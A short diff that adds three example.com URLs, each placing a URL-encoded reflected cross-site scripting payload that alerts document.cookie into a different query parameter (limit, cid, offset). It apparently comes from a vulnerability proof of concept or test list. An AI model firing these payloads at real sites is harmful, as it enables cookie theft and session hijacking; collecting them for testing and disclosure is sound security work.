@@ -1,0 +1,3 @@
+http://www.example.com/?offset=1&cid=1&limit=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/?offset=1&cid=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/?offset=%3Cscript%3Ealert(document.cookie)%3C/script%3E&cid=1
